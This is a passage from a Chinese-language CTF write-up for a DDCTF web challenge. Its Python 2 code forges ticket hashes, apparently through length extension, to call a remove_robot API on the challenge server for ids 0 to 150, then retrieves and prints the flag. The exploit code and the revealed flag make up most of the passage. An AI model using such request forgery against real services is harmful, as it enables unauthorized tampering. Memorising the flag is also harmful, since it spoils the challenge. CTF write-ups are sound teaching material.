        r = s.get("http://117.51.147.155:5050/ctf/api/remove_robot?{}=&id=62&ticket={}".format(msg,tic))
        time.sleep(1)
        if json.loads(r.text)['code'] == 200:
            print 'success'
            print r.text+json.loads(r.text)['msg']
            break
```

跑出来13

然后遍历`id=1 ~ 150`
```
    m = get_hash('35c26fc4f394c54e934379cb8d80ed85','id62','id62',31)
    msg = m[2].rstrip('id62')
    tic = m[0]
    r = s.get("http://117.51.147.155:5050/ctf/api/remove_robot?{}=&id=62&ticket={}".format(msg,tic))
    print r.text
    for i in range(0,151):
        print i
        m = get_hash('35c26fc4f394c54e934379cb8d80ed85','id62','id{}'.format(i),31)
        tic = m[0]
        msg = ''.join(m[2].rsplit('id{}'.format(i), 1))
        print msg
        print "http://117.51.147.155:5050/ctf/api/remove_robot?{}=&id={}&ticket={}".format(msg,i,tic)
        r = s.get("http://117.51.147.155:5050/ctf/api/remove_robot?{}=&id={}&ticket={}".format(msg,i,tic))
        time.sleep(1)
        print r.text
        print json.loads(r.text)['msg']
    r = self.s.get('http://117.51.147.155:5050/ctf/api/get_flag')
    print r.text
```

r.text
```
flag {"code":200,"data":["DDCTF{chiken_dinner_hyMCX[n47Fx)}"],"msg":"\u5927\u5409\u5927\u5229\uff0c\u4eca\u665a\u5403\u9e21"}
```


```
DDCTF{chiken_dinner_hyMCX[n47Fx)}
```

